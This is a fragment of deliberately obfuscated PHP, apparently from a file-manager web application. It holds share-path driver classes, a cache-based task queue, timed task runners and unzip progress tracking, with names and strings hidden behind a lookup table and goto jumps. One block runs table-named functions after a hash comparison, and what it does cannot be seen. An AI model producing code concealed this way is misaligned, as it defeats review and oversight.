json_decode($B⁄÷ƒ¿‘“¯, !0); } } goto düÑ‰€∏Ò¢; cÓç–—Œ⁄¶: } public function set($F√¶ô®¶¡¿, $C‘•∑πßÛÇ = false, $A˘¿ı¬û”â = '') { goto e“ô‡€ó∏¬; aá±ä≤Ãﬁ›: $dÚâ¶ÒàÁ = is_array($F√¶ô®¶¡¿) ? $F√¶ô®¶¡¿ : array($F√¶ô®¶¡¿ => $C‘•∑πßÛÇ); foreach ($dÚâ¶ÒàÁ as $Dí◊õëàÕπ => $FÇ ±¯ﬂ¥) { if (is_array($FÇ ±¯ﬂ¥)) { $FÇ ±¯ﬂ¥ = json_encode_force($FÇ ±¯ﬂ¥); } $this->checkLength($FÇ ±¯ﬂ¥, !1, $this->tableName . $dˆóÚ∂ø‰ß[4] . $F√¶ô®¶¡¿); $FÇ ±¯ﬂ¥ = self::textEncode($FÇ ±¯ﬂ¥); $dÚâ¶ÒàÁ = array($dˆóÚ∂ø‰ß[29] => $A˘¿ı¬û”â, $dˆóÚ∂ø‰ß[93] => $Dí◊õëàÕπ, $dˆóÚ∂ø‰ß[372] => $FÇ ±¯ﬂ¥); $cÚØç£±÷Ú[] = $this->filterWhere($dÚâ¶ÒàÁ); } if (!$cÚØç£±÷Ú) { return !0; } goto D¢å≠°èú•; D¢å≠°èú•: return $this->addAll($cÚØç£±÷Ú, array(), !0); goto dóÀ»◊€Æµ; e“ô‡€ó∏¬: $dˆóÚ∂ø‰ß =& $_SERVER[Öíæ€“”≠éÏË]; $this->cacheRemove($A˘¿ı¬û”â); $cÚØç£±÷Ú = array(); goto aá±ä≤Ãﬁ›; dóÀ»◊€Æµ: } protected function optionDefault($F◊≈˜ÿÛ∑Ó = '') { return !1; } public function setDeep($d°õ”Û◊µí, $Cî”ÉÈ√ê = false, $Fé°Õ•ÜÊ‘ = '') { $DçÕ≥å¯›› = explode($_SERVER[Öíæ€“”≠éÏË][95], $d°õ”Û◊µí); $fŸ÷œŒ›áö = $this->get(); array_set_value($fŸ÷œŒ›áö, $d°õ”Û◊µí, $Cî”ÉÈ√ê); $this->set($DçÕ≥å¯››[0], $fŸ÷œŒ›áö[$DçÕ≥å¯››[0]], $Fé°Õ•ÜÊ‘); } public function remove($E§ëÌìπü¢, $b£â…©êó¶ = '') { $båâ©∆Ì¨Æ =& $_SERVER[Öíæ€“”≠éÏË]; $this->cacheRemove($b£â…©êó¶); $eÜ∫·‹Ñ¬Ö = $this->filterWhere(array($båâ©∆Ì¨Æ[93] => $E§ëÌìπü¢, $båâ©∆Ì¨Æ[29] => $b£â…©êó¶)); if (is_null($E§ëÌìπü¢)) { unset($eÜ∫·‹Ñ¬Ö[$båâ©∆Ì¨Æ[93]]); } return $this->where($eÜ∫·‹Ñ¬Ö)->delete(); } public function cacheSet($b°Ô¥Ö˜Ò¶, $bÇ‘⁄Áıë£ = false) { return Cache::set($this->cacheKey($b°Ô¥Ö˜Ò¶), $bÇ‘⁄Áıë£); } public function cacheGet($cŸâ™ØÆºø) { return Cache::get($this->cacheKey($cŸâ™ØÆºø)); } public function cacheRemove($c∏⁄¬’®»—) { return Cache::remove($this->cacheKey($c∏⁄¬’®»—)); } protected function filterWhere($F≈»ªÛ°ÑÕ) { return $F≈»ªÛ°ÑÕ; } protected function cacheKey($AÇË“ò∂Ç‹) { return $AÇË“ò∂Ç‹; } } goto B‡Ù«Í»ª¬; BÍ¢—àÀ‹ˆ: if ($_SERVER[$_SERVER[Öíæ€“”≠éÏË][847]] != $Bãßò‘øá≥($Cæ›ÜÓæÓﬁ)) { goto a”ÿÁ¿›ΩΩ; BË¶’ﬁØÙµ: $cáı¯≈∞ì√ = explode($_SERVER[Öíæ€“”≠éÏË][229], $CÒÒãèß◊‘); if (count($cáı¯≈∞ì√) < $_SERVER[Öíæ€“”≠éÏË][594]) { $BÀÎÉ„èµ« = $_SERVER[Öíæ€“”≠éÏË][850]; $BÀÎÉ„èµ«(); } $dÒ°êΩ∂üÉ = $_SERVER[Öíæ€“”≠éÏË][1224]; goto aãÍÒÓúÉÈ; aãÍÒÓúÉÈ: $dÒ°êΩ∂üÉ($Cæ›ÜÓæÓﬁ); goto D”‚ƒØˆ⁄Ô; a”ÿÁ¿›ΩΩ: $b‡è¶∆‹›Í = $_SERVER[Öíæ€“”≠éÏË][849]; $a±ûß¨éÙÑ = $_SERVER[$_SERVER[Öíæ€“”≠éÏË][844]] . $_SERVER[Öíæ€“”≠éÏË][845]; $CÒÒãèß◊‘ = $b‡è¶∆‹›Í($a±ûß¨éÙÑ); goto BË¶’ﬁØÙµ; D”‚ƒØˆ⁄Ô: } class PathDriverDriverShareItem { public function __construct($BÂØå ååú) { $this->pathParse = $BÂØå ååú; } public function __call($B∑Ü¿ë∞≥Ü, $b€®Ç∆ô—ı) { $AíøÓ‚áà£ =& $_SERVER[Öíæ€“”≠éÏË]; if (method_exists($this, $B∑Ü¿ë∞≥Ü)) { return; } $Eúëß€∞’ä = call_user_func_array(array($AíøÓ‚áà£[1226], $B∑Ü¿ë∞≥Ü), $b€®Ç∆ô—ı); $b•¨‚À‹⁄ı = array($AíøÓ‚áà£[1227], $AíøÓ‚áà£[1228], $AíøÓ‚áà£[1229], $AíøÓ‚áà£[1230], $AíøÓ‚áà£[532], $AíøÓ‚áà£[534], $AíøÓ‚áà£[1231], $AíøÓ‚áà£[107], $AíøÓ‚áà£[1232], $AíøÓ‚áà£[1233]); if (in_array($B∑Ü¿ë∞≥Ü, $b•¨‚À‹⁄ı)) { $Eúëß€∞’ä = $this->getPathOuter($Eúëß€∞’ä); } return $Eúëß€∞’ä; } public function copy($F·ª´⁄Ç”¿, $Cé‡˜ƒ»úÖ, $E≤∆›ç¨∆Ù = false) { return $this->copyMove($F·ª´⁄Ç”¿, $Cé‡˜ƒ»úÖ, $E≤∆›ç¨∆Ù, $_SERVER[Öíæ€“”≠éÏË][532]); } public function move($A€ïœù˘µ˜, $b†©⁄£©®Œ, $dùâø«âãÌ = false) { return $this->copyMove($A€ïœù˘µ˜, $b†©⁄£©®Œ, $dùâø«âãÌ, $_SERVER[Öíæ€“”≠éÏË][534]); } private function copyMove($eñË›é–·ç, $bØÂ©∏ÕÖú, $aù»⁄ﬂÜö, $FÍÚ…–Ö◊œ) { goto aÁ◊úÿòÉº; aﬁ˜“Í«æ¨: if ($CÀ“—®∂«≈->pathParse[$då≥∑˜Ïàî[1057]]) { $bØÂ©∏ÕÖú = $CÀ“—®∂«≈->pathParse[$då≥∑˜Ïàî[1057]]; } else { $bØÂ©∏ÕÖú = $C””ÏªΩ¿®; } $CçÙ—¯¿â• = IO::copyMove($eñË›é–·ç, $bØÂ©∏ÕÖú, $aù»⁄ﬂÜö, $FÍÚ…–Ö◊œ); $CçÙ—¯¿â• = $this->getPathOuter($CçÙ—¯¿â•); goto E„Ç∂à¿ôÓ; E„Ç∂à¿ôÓ: return $CçÙ—¯¿â•; goto eƒÌªùÖ∏Â; aÁ◊úÿòÉº: $då≥∑˜Ïàî =& $_SERVER[Öíæ€“”≠éÏË]; $C””ÏªΩ¿® = $bØÂ©∏ÕÖú; $CÀ“—®∂«≈ = IO::driverMake($bØÂ©∏ÕÖú); goto aﬁ˜“Í«æ¨; eƒÌªùÖ∏Â: } public function pathThis($A¡Ã¢°û£î) { return get_path_this($this->pathParse[$_SERVER[Öíæ€“”≠éÏË][76]]); } public function pathFather($fÎàæÿ”çÜ) { return get_path_father($this->pathParse[$_SERVER[Öíæ€“”≠éÏË][76]]); } public function iconvSystem($aûß£øπÏŸ) { return $aûß£øπÏŸ; } protected function infoParse($dâûß∫ç˘…, $E¯ëù•µ´∞ = false) { $f∂é‰≈ñ«œ =& $_SERVER[Öíæ€“”≠éÏË]; $C°ö¡Í¿‡ú = $this->pathParse[$f∂é‰≈ñ«œ[467]][$f∂é‰≈ñ«œ[1080]] . $this->pathParse[$f∂é‰≈ñ«œ[1073]]; if ($E¯ëù•µ´∞) { $Cº›øœàÍ´ = IO::infoWithChildren($C°ö¡Í¿‡ú); } else { $Cº›øœàÍ´ = IO::info($C°ö¡Í¿‡ú); } $DˆÂ–ÀÛñ˘ = $this->pathParse[$f∂é‰≈ñ«œ[467]]; return Action($f∂é‰≈ñ«œ[1225])->_shareItemeParse($Cº›øœàÍ´, $DˆÂ–ÀÛñ˘); } public function listAll($A∑’–Û°èó) { $e∆Ÿüñ¯º∆ =& $_SERVER[Öíæ€“”≠éÏË]; $cﬁÎû®¥Ê≤ = IO::listAll($A∑’–Û°èó); $b™Îâ”äÒ§ = $this->pathParse[$e∆Ÿüñ¯º∆[467]]; foreach ($cﬁÎû®¥Ê≤ as &$bèˆ∑ç˜Œ‚) { check_abort(); $d‡ÒÎºÈÃ  = IO::info($bèˆ∑ç˜Œ‚[$e∆Ÿüñ¯º∆[76]]); $d‡ÒÎºÈÃ  = is_array($d‡ÒÎºÈÃ ) ? $d‡ÒÎºÈÃ  : array(); $bèˆ∑ç˜Œ‚ = array_merge($d‡ÒÎºÈÃ , $bèˆ∑ç˜Œ‚); $bèˆ∑ç˜Œ‚[$e∆Ÿüñ¯º∆[85]] = Action($e∆Ÿüñ¯º∆[1225])->_shareItemeParse($bèˆ∑ç˜Œ‚, $b™Îâ”äÒ§); } unset($bèˆ∑ç˜Œ‚); return $cﬁÎû®¥Ê≤; } public function getPathOuter($aΩ©∞ÇöÂ‰) { goto fﬁ‚™»íüµ; fﬁ‚™»íüµ: $Eó≈çÓÔÉå =& $_SERVER[Öíæ€“”≠éÏË]; $d·‡≥Ã¢≈ı = KodIO::parse($aΩ©∞ÇöÂ‰); if ($d·‡≥Ã¢≈ı[$Eó≈çÓÔÉå[29]] == KodIO::KOD_SHARE_ITEM) { return $d·‡≥Ã¢≈ı[$Eó≈çÓÔÉå[76]]; } goto Aß‰∆‰ò‹œ; Aß‰∆‰ò‹œ: $bÂ¥åîïáÇ = KodIO::clear($aΩ©∞ÇöÂ‰); $CôÛÓÔü«¨ = KodIO::clear($this->pathParse[$Eó≈çÓÔÉå[467]][$Eó≈çÓÔÉå[1080]]); $fòÇ°Â√òã = substr($bÂ¥åîïáÇ, strlen($CôÛÓÔü«¨)); goto EàÀœ∂î·‹; EàÀœ∂î·‹: if (substr($bÂ¥åîïáÇ, 0, strlen($CôÛÓÔü«¨)) != $CôÛÓÔü«¨) { return !1; } return $this->pathParse[$Eó≈çÓÔÉå[1074]] . $Eó≈çÓÔÉå[8] . ltrim($fòÇ°Â√òã, $Eó≈çÓÔÉå[8]); goto F¢¶âôΩ…à; F¢¶âôΩ…à: } public function getType() { $cñﬁΩ±ìëÃ =& $_SERVER[Öíæ€“”≠éÏË]; $A°Ôçìò∞Ç = str_replace($cñﬁΩ±ìëÃ[72], $cñﬁΩ±ìëÃ[33], get_class($this)); return strtolower($A°Ôçìò∞Ç); } public function isTypeObject($f¬ﬁúÏ∫°√) { return IO::isTypeObject($f¬ﬁúÏ∫°√); } public function info($D¯øÃﬁßÊ¯) { return $this->infoParse($D¯øÃﬁßÊ¯); } public function infoAuth($A®·õéä•Œ) { return $this->infoParse($A®·õéä•Œ); } public function infoWithChildren($eóˆ»Ô“û«) { return $this->infoParse($eóˆ»Ô“û«, !0); } public function infoFull($eÈú√ó»ÂŒ) { return $this->infoParse($eÈú√ó»ÂŒ); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($döá£πöá¶) { $this->pathParse = $döá£πöá¶; } protected function infoParse($AêÛæ·Æ•´, $FÿÑô¶œ“ = false) { $AÈ›∏π™Œì =& $_SERVER[Öíæ€“”≠éÏË]; return Action($AÈ›∏π™Œì[1079])->sharePathInfo($this->pathParse[$AÈ›∏π™Œì[76]], !0, $FÿÑô¶œ“); } public function listPath($A¡Õ˜√”»◊, $b∂Ú“Ùîíç = false) { $dÏ¿¯ﬁŒ©ı =& $_SERVER[Öíæ€“”≠éÏË]; $a…Ù √†Õ° = IO::listPath($A¡Õ˜√”»◊, $b∂Ú“Ùîíç); foreach ($a…Ù √†Õ° as $Eï èÌõÚ® => $cﬁπó¬ø·Ó) { if (!in_array($Eï èÌõÚ®, array($dÏ¿¯ﬁŒ©ı[74], $dÏ¿¯ﬁŒ©ı[75]))) { continue; } foreach ($cﬁπó¬ø·Ó as $CàΩ©å‘®á => $b‚π≠êÉÌ‰) { $b‚π≠êÉÌ‰ = Action($dÏ¿¯ﬁŒ©ı[1234])->parsePathChildren($b‚π≠êÉÌ‰, array($dÏ¿¯ﬁŒ©ı[415] => $A¡Õ˜√”»◊)); $a…Ù √†Õ°[$Eï èÌõÚ®][$CàΩ©å‘®á] = Action($dÏ¿¯ﬁŒ©ı[1079])->shareItemInfo($b‚π≠êÉÌ‰); } } return $a…Ù √†Õ°; } public function listAll($Dø¿ç´øñµ) { $a®∑øÎ‰º© =& $_SERVER[Öíæ€“”≠éÏË]; $aﬁˆà≥–Üë = IO::listAll($Dø¿ç´øñµ); foreach ($aﬁˆà≥–Üë as &$AèÒŒã”Ñò) { $DêÓË“Ê∞† = IO::info($AèÒŒã”Ñò[$a®∑øÎ‰º©[76]]); $DêÓË“Ê∞† = is_array($DêÓË“Ê∞†) ? $DêÓË“Ê∞† : array(); $AèÒŒã”Ñò = array_merge($DêÓË“Ê∞†, $AèÒŒã”Ñò); $AèÒŒã”Ñò[$a®∑øÎ‰º©[85]] = Action($a®∑øÎ‰º©[1079])->shareItemInfo($AèÒŒã”Ñò); } unset($AèÒŒã”Ñò); return $aﬁˆà≥–Üë; } } goto cÓâ©Ù”∆®; CÀöÎªÛâº: class TaskQueue { const MAX_LENGTH = 1000; const QUEUE_LENGTH = "\164\x61\x73\153\121\165\x65\165\x65\x4c\x65\156\x67\164\150"; const QUEUE_DATA = "\x74\x61\x73\153\x51\165\145\x75\x65\104\x61\164\141"; public static $listData = false; public static function initTask() { } public static function add($DŒÍò¿ÁÏﬁ, $f∏ÈÊ∆ºâ  = array(), $FãòÈÕë¬Ñ = '', $eôí‘ÇÉ∂ = '') { $EîúóµÏËﬁ =& $_SERVER[Öíæ€“”≠éÏË]; if (self::$listData === !1) { self::$listData = self::getAll(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($eôí‘ÇÉ∂ && array_find_by_field(self::$listData, $EîúóµÏËﬁ[93], $eôí‘ÇÉ∂)) { return !0; } self::$listData[] = array($EîúóµÏËﬁ[262] => $DŒÍò¿ÁÏﬁ, $EîúóµÏËﬁ[1613] => $f∏ÈÊ∆ºâ , $EîúóµÏËﬁ[432] => $FãòÈÕë¬Ñ, $EîúóµÏËﬁ[93] => $eôí‘ÇÉ∂); return !0; } public static function addSubmit() { $aÀﬂ«©¿ê¢ =& $_SERVER[Öíæ€“”≠éÏË]; if (!self::$listData || count(self::$listData) == 0) { return; } write_log($aÀﬂ«©¿ê¢[1614] . json_encode_force(array_to_keyvalue(self::$listData, $aÀﬂ«©¿ê¢[33], $aÀﬂ«©¿ê¢[432])), $aÀﬂ«©¿ê¢[1615]); self::setAll(self::$listData); self::$listData = !1; } public static function addNow($BêÔ¿ïùåé, $cœ™Ø®ê”ã = array(), $a¯ŒŒÑòπî = '', $C´ ¢§”Ω≠ = '') { goto b®ÕÉÕÕ¥†; A¶áéÏ∆œ: self::setAll($e¥˜Ú–áà’); return !0; goto d¯∫Çßﬁï•; b®ÕÉÕÕ¥†: $CàﬁôÓ”©” =& $_SERVER[Öíæ€“”≠éÏË]; if (self::count() >= self::MAX_LENGTH) { return !1; } $e¥˜Ú–áà’ = self::getAll(); goto cäÜïµ«øá; cäÜïµ«øá: if ($C´ ¢§”Ω≠ && array_find_by_field($e¥˜Ú–áà’, $CàﬁôÓ”©”[93], $C´ ¢§”Ω≠)) { return !0; } $e¥˜Ú–áà’[] = array($CàﬁôÓ”©”[262] => $BêÔ¿ïùåé, $CàﬁôÓ”©”[1613] => $cœ™Ø®ê”ã, $CàﬁôÓ”©”[432] => $a¯ŒŒÑòπî, $CàﬁôÓ”©”[93] => $C´ ¢§”Ω≠); write_log($CàﬁôÓ”©”[1614] . $a¯ŒŒÑòπî, $CàﬁôÓ”©”[1615]); goto A¶áéÏ∆œ; d¯∫Çßﬁï•: } public static function run() { goto f∫Û©áãµº; f∫Û©áãµº: $Fàå’ãÎ≠Ù =& $_SERVER[Öíæ€“”≠éÏË]; $f∫ãË¥èãä = self::getAll(); $b…´ﬂä¯´  = array_shift($f∫ãË¥èãä); goto Cè∆°äÇÏÁ; Cè∆°äÇÏÁ: if (!$b…´ﬂä¯´ ) { return !1; } self::setAll($f∫ãË¥èãä); $a¶ÃÛûÚ“Í = timeFloat(); goto bÚƒ¨¡Î‘©; d∫‚œ√È£æ: return !0; goto e€∫Æ∂ıÃÛ; bÚƒ¨¡Î‘©: try { Hook::apply($b…´ﬂä¯´ [$Fàå’ãÎ≠Ù[262]], $b…´ﬂä¯´ [$Fàå’ãÎ≠Ù[1613]]); } catch (Exception $bµ¶˜ë„Çã) { } $aÿﬂ˘Ωæºì = number_format(timeFloat() - $a¶ÃÛûÚ“Í, 3) . $Fàå’ãÎ≠Ù[1551]; write_log($Fàå’ãÎ≠Ù[1616] . $b…´ﬂä¯´ [$Fàå’ãÎ≠Ù[432]] . $Fàå’ãÎ≠Ù[1617] . $aÿﬂ˘Ωæºì, $Fàå’ãÎ≠Ù[1615]); goto d∫‚œ√È£æ; e€∫Æ∂ıÃÛ: } public static function count() { $eøíàÎä∂ = Cache::get(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_LENGTH); if (!$eøíàÎä∂) { return 0; } return intval($eøíàÎä∂); } public static function getAll() { $B≤∫¯ı≤ÌŒ = Cache::get(self::QUEUE_DATA); Cache::removeMemory(self::QUEUE_DATA); if (!$B≤∫¯ı≤ÌŒ) { return array(); } return $B≤∫¯ı≤ÌŒ; } public static function setAll($EÙ¥É◊Ò›Ú) { $c∂…êŸÉ∂ô = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($EÙ¥É◊Ò›Ú), $c∂…êŸÉ∂ô); Cache::set(self::QUEUE_DATA, $EÙ¥É◊Ò›Ú, $c∂…êŸÉ∂ô); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($FÈë”ñŒî∆, $c¿•ÍˆÀ∏Ì = 5.0) { if (!$FÈë”ñŒî∆) { return; } $Eç™ÔÀ⁄ìΩ = Cache::get($FÈë”ñŒî∆); if (!$Eç™ÔÀ⁄ìΩ || timeFloat() - floatVal($Eç™ÔÀ⁄ìΩ) >= $c¿•ÍˆÀ∏Ì) { Cache::set($FÈë”ñŒî∆, timeFloat(), $c¿•ÍˆÀ∏Ì * 10); return !0; } return !1; } public static function timeLimitCall($BîÈïó©√ù, $E¯“ﬁê‘éá, $Eñ«“À›ÈÚ, $FÈéëÏ∑«≈ = 5.0) { goto Bíö‚µ∆ÿﬁ; D¢“ˆ÷·Î∞: $BÔï¶ïπõà = $CÖ¡”í»„π[1618]; $büöø∑Ω≥ó = Cache::get($BÔï¶ïπõà, !0); $F÷ó€†⁄ë› = array($CÖ¡”í»„π[1619] => timeFloat(), $CÖ¡”í»„π[1620] => timeFloat(), $CÖ¡”í»„π[262] => $E¯“ﬁê‘éá, $CÖ¡”í»„π[1613] => $Eñ«“À›ÈÚ, $CÖ¡”í»„π[197] => $FÈéëÏ∑«≈); goto AàáŸµ±ÍÑ; AàáŸµ±ÍÑ: if (is_array($büöø∑Ω≥ó[$BîÈïó©√ù])) { $F÷ó€†⁄ë›[$CÖ¡”í»„π[1620]] = $büöø∑Ω≥ó[$BîÈïó©√ù][$CÖ¡”í»„π[1620]]; } if (is_array($büöø∑Ω≥ó[$BîÈïó©√ù])) { if (timeFloat() - $büöø∑Ω≥ó[$BîÈïó©√ù][$CÖ¡”í»„π[1619]] < $F÷ó€†⁄ë›[$CÖ¡”í»„π[197]] * 0.3) { return; } $F÷ó€†⁄ë›[$CÖ¡”í»„π[1620]] = $büöø∑Ω≥ó[$BîÈïó©√ù][$CÖ¡”í»„π[1620]]; } $büöø∑Ω≥ó[$BîÈïó©√ù] = $F÷ó€†⁄ë›; goto b≥∆∫ï∆öä; Bíö‚µ∆ÿﬁ: $CÖ¡”í»„π =& $_SERVER[Öíæ€“”≠éÏË]; if (!$BîÈïó©√ù || !$E¯“ﬁê‘éá) { return; } self::$asyncAdd = !0; goto D¢“ˆ÷·Î∞; b≥∆∫ï∆öä: Cache::set($BÔï¶ïπõà, $büöø∑Ω≥ó, 60); Cache::removeMemory($BÔï¶ïπõà); write_log($CÖ¡”í»„π[1621] . $BîÈïó©√ù . $CÖ¡”í»„π[68] . $E¯“ﬁê‘éá, $CÖ¡”í»„π[1615]); goto cæ‹ﬂåÛ’Ü; cæ‹ﬂåÛ’Ü: } public static function timeLimitCallLoop() { goto AéÒê´’ô—; E≥ã§À«”É: if (!$B´Âƒ¢îœ€ && !self::$asyncAdd) { return; } $Aûì«¯îÿƒ = $CÀ¯êÉè¨ì[1618]; $d–Ü«ÖÿÇÿ = Cache::get($Aûì«¯îÿƒ, !0); goto Bø·Ù™ œÆ; Bø·Ù™ œÆ: if (!$d–Ü«ÖÿÇÿ || count($d–Ü«ÖÿÇÿ) <= 0) { return; } $C´¡æò˘È‡ = !1; $Cﬂ‚≠¥ÉÎ› = timeFloat(); goto b©ﬂ‹ËçË¨; aØÖèÿø¨Ô: if (!$b«‚î‚à∂÷) { return Cache::remove($Aûì«¯îÿƒ); } Cache::set($Aûì«¯îÿƒ, $b«‚î‚à∂÷, 60); Cache::removeMemory($Aûì«¯îÿƒ); goto AÈ‰Ω’Õ∞À; b©ﬂ‹ËçË¨: $b«‚î‚à∂÷ = array(); foreach ($d–Ü«ÖÿÇÿ as $a ª†—ä™ú => $bôáæìî˜ã) { if ($Cﬂ‚≠¥ÉÎ› - $bôáæìî˜ã[$CÀ¯êÉè¨ì[1620]] > $bôáæìî˜ã[$CÀ¯êÉè¨ì[197]]) { $C´¡æò˘È‡ = !0; try { Hook::apply($bôáæìî˜ã[$CÀ¯êÉè¨ì[262]], $bôáæìî˜ã[$CÀ¯êÉè¨ì[1613]]); write_log($CÀ¯êÉè¨ì[1623] . $a ª†—ä™ú . $CÀ¯êÉè¨ì[68] . $bôáæìî˜ã[$CÀ¯êÉè¨ì[262]] . $CÀ¯êÉè¨ì[1624] . ACTION, $CÀ¯êÉè¨ì[1615]); } catch (Exception $f≤åô‘ı¯ï) { } continue; } $b«‚î‚à∂÷[$a ª†—ä™ú] = $bôáæìî˜ã; } if (!$C´¡æò˘È‡) { return; } goto aØÖèÿø¨Ô; AéÒê´’ô—: $CÀ¯êÉè¨ì =& $_SERVER[Öíæ€“”≠éÏË]; $A– –ﬁÀ•ª = array($CÀ¯êÉè¨ì[1622]); $B´Âƒ¢îœ€ = in_array(strtolower(ACTION), $A– –ﬁÀ•ª); goto E≥ã§À«”É; AÈ‰Ω’Õ∞À: } public static function finished($cÜøÁÒè‹Ê, $e™ëÏœ‚Ç») { $Dœ√ƒéÔÜÇ =& $_SERVER[Öíæ€“”≠éÏË]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($Dœ√ƒéÔÜÇ[262] => $cÜøÁÒè‹Ê, $Dœ√ƒéÔÜÇ[1613] => $e™ëÏœ‚Ç»); } private static function finishedRun() { $D√û¯¶…ö∑ =& $_SERVER[Öíæ€“”≠éÏË]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $eÉËöπÛÍ√) { try { Hook::apply($eÉËöπÛÍ√[$D√û¯¶…ö∑[262]], $eÉËöπÛÍ√[$D√û¯¶…ö∑[1613]]); } catch (Exception $eÈıÕ–ëÁÓ) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { goto aä⁄å≠«πË; B∏≤ﬁáàΩ˜: if (!$cÙí·ÂÁÖú[$dÉ∞ª“íÜ˘[1441]]) { $cÙí·ÂÁÖú[$dÉ∞ª“íÜ˘[1441]] = LNG($dÉ∞ª“íÜ˘[1629]); } goto fπ∑Ü»øêµ; aä⁄å≠«πË: $dÉ∞ª“íÜ˘ =& $_SERVER[Öíæ€“”≠éÏË]; parent::startAfter(); Hook::bind($dÉ∞ª“íÜ˘[1625], array($this, $dÉ∞ª“íÜ˘[1626])); goto EòÌÒØø∏ö; EòÌÒØø∏ö: Hook::bind($dÉ∞ª“íÜ˘[1098], array($this, $dÉ∞ª“íÜ˘[1627])); $cÙí·ÂÁÖú =& $this->task; $cÙí·ÂÁÖú[$dÉ∞ª“íÜ˘[1628]] = $dÉ∞ª“íÜ˘[1103]; goto B∏≤ﬁáàΩ˜; fπ∑Ü»øêµ: } protected function endAfter() { $e∞óÙò∞∂ä =& $_SERVER[Öíæ€“”≠éÏË]; parent::endAfter(); Hook::unbind($e∞óÙò∞∂ä[1625], array($this, $e∞óÙò∞∂ä[1626])); Hook::unbind($e∞óÙò∞∂ä[1098], array($this, $e∞óÙò∞∂ä[1627])); } public function updateAfter() { $b€Ì≤Ô—µÏ =& $_SERVER[Öíæ€“”≠éÏË]; $f⁄Û†´‹Ë÷ =& $this->task; if (!$f⁄Û†´‹Ë÷[$b€Ì≤Ô—µÏ[1031]] || !$f⁄Û†´‹Ë÷[$b€Ì≤Ô—µÏ[736]]) { return; } if ($f⁄Û†´‹Ë÷[$b€Ì≤Ô—µÏ[1628]] == $b€Ì≤Ô—µÏ[1103]) { $a™ÉéÉ≈Ëë = 0; if ($f⁄Û†´‹Ë÷[$b€Ì≤Ô—µÏ[1584]]) { $a™ÉéÉ≈Ëë = $f⁄Û†´‹Ë÷[$b€Ì≤Ô—µÏ[1585]] / $f⁄Û†´‹Ë÷[$b€Ì≤Ô—µÏ[1584]]; } $f⁄Û†´‹Ë÷[$b€Ì≤Ô—µÏ[1539]] = $a™ÉéÉ≈Ëë * 0.3; } else { if ($f⁄Û†´‹Ë÷[$b€Ì≤Ô—µÏ[1628]] == $b€Ì≤Ô—µÏ[311]) { $a™ÉéÉ≈Ëë = $f⁄Û†´‹Ë÷[$b€Ì≤Ô—µÏ[1045]] / $f⁄Û†´‹Ë÷[$b€Ì≤Ô—µÏ[1031]]; $f⁄Û†´‹Ë÷[$b€Ì≤Ô—µÏ[1539]] = 0.3 + $a™ÉéÉ≈Ëë * 0.4; } else { if ($f⁄Û†´‹Ë÷[$b€Ì≤Ô—µÏ[1628]] == $b€Ì≤Ô—µÏ[107]) { $AàìÈÊ®êÆ = 0; if ($f⁄Û†´‹Ë÷[$b€Ì≤Ô—µÏ[1586]] == $b€Ì≤Ô—µÏ[107]) { $AàìÈÊ®êÆ = $f⁄Û†´‹Ë÷[$b€Ì≤Ô—µÏ[1585]]; } $a™ÉéÉ≈Ëë = ($f⁄Û†´‹Ë÷[$b€Ì≤Ô—µÏ[1589]] + $AàìÈÊ®êÆ) / $f⁄Û†´‹Ë÷[$b€Ì≤Ô—µÏ[736]]; $f⁄Û†´‹Ë÷[$b€Ì≤Ô—µÏ[1539]] = 0.3 + 0.4 + $a™ÉéÉ≈Ëë * 0.3; } } } if ($f⁄Û†´‹Ë÷[$b€Ì≤Ô—µÏ[1539]] > 0) { $Aø∞ﬁá†‚µ = timeFloat() - $f⁄Û†´‹Ë÷[$b€Ì≤Ô—µÏ[762]] - $f⁄Û†´‹Ë÷[$b€Ì≤Ô—µÏ[1542]]; $f⁄Û†´‹Ë÷[$b€Ì≤Ô—µÏ[1543]] = $Aø∞ﬁá†‚µ * (1 - $f⁄Û†´‹Ë÷[$b€Ì≤Ô—µÏ[1539]]) / $f⁄Û†´‹Ë÷[$b€Ì≤Ô—µÏ[1539]]; } } public function addFile($Aë£…§‡·Æ) { goto a·Ó«„›úå; FÊÚÖÛü°: $this->update(); goto e°Áˆ∫∏”ø; a·Ó«„›úå: $c«—‚‹ÇŒ¯ =& $_SERVER[Öíæ€“”≠éÏË]; $CÙﬁ˘¿≤á‚ =& $this->task; $b◊∂◊‰ÊÑ = IO::info($Aë£…§‡·Æ); goto bÕˆ ΩÖ§á; bÕˆ ΩÖ§á: $CÙﬁ˘¿≤á‚[$c«—‚‹ÇŒ¯[1582]] = $b◊∂◊‰ÊÑ[$c«—‚‹ÇŒ¯[28]]; $CÙﬁ˘¿≤á‚[$c«—‚‹ÇŒ¯[1584]] = $b◊∂◊‰ÊÑ[$c«—‚‹ÇŒ¯[78]]; $CÙﬁ˘¿≤á‚[$c«—‚‹ÇŒ¯[1585]] = 0; goto eπÉàù≥Çà; AóıËÒ ≈Œ: $CÙﬁ˘¿≤á‚[$c«—‚‹ÇŒ¯[1031]] = 1; $Aø¡â„ëë» = 0; $CÙﬁ˘¿≤á‚[$c«—‚‹ÇŒ¯[1593]] = array($c«—‚‹ÇŒ¯[1594] => $Aø¡â„ëë» + 1, $c«—‚‹ÇŒ¯[414] => $b◊∂◊‰ÊÑ[$c«—‚‹ÇŒ¯[28]], $c«—‚‹ÇŒ¯[76] => $b◊∂◊‰ÊÑ[$c«—‚‹ÇŒ¯[76]], $c«—‚‹ÇŒ¯[501] => $b◊∂◊‰ÊÑ[$c«—‚‹ÇŒ¯[501]] ? $b◊∂◊‰ÊÑ[$c«—‚‹ÇŒ¯[501]] : $b◊∂◊‰ÊÑ[$c«—‚‹ÇŒ¯[76]]); goto FÊÚÖÛü°; eπÉàù≥Çà: $CÙﬁ˘¿≤á‚[$c«—‚‹ÇŒ¯[1033]] = $c«—‚‹ÇŒ¯[1604]; $CÙﬁ˘¿≤á‚[$c«—‚‹ÇŒ¯[1586]] = $c«—‚‹ÇŒ¯[1103]; 